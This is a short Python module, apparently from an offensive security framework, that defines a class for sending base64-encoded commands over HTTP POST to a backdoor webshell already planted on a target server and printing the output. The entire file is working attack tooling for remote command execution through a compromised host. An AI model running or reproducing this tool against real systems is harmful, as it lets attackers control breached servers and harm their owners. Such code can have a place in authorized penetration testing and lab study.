#!/usr/bin/env python
# coding: UTF-8
import requests
import sys
import base64

class AtkBackdoorWebshellSendCmd(object):
    def __init__(self, utility, host="127.0.0.1", port="80", debug=False):
        self.utility = utility
        self.host = host
        self.port = port
        self.ua = utility.ua
        self.debug = debug
        self.description = "The module can be execute commands if a webshell is still existing."
        self.target = host + ":" + port

    def __str__(self):
        return 'AtkBackdoorWebshellSendCmd object (target: %s, description: %s)' % (self.target, self.description)

    __repr__ = __str__


    def sendattack(self, target_path, payload):
        #proxy
        #proxies = {"http": "http://127.0.0.1:8080","https": "http://127.0.0.1:8080"}
        proxies = {"http": None,"https": None}

        # connect timeout, read timeout
        timeoutvalue= (5.0, 5.5)

        try:
            self.logger("Attack Start", "+")

            session = requests.Session()

            print("execute command: "+ payload)

            postdata = { "cmd": base64.b64encode(payload.encode()).decode() }

            target_url = "http://" + self.target + target_path
            headers = { "User-Agent": self.ua }
            response = session.post(target_url, data=postdata, headers=headers, proxies=proxies, timeout=timeoutvalue)

            print("-----Set Comand-----")
            print(response.text)

            self.logger("Attack Complete!!", "+")

        except requests.exceptions.RequestException as e:
            self.logger("Error occurred", "!")
            file=sys.stderr
            print(e)
            #sys.exit(1)

    def logger(self, m="", o="+"):
        message = "[{}] {}".format(o,m)
        print(message)
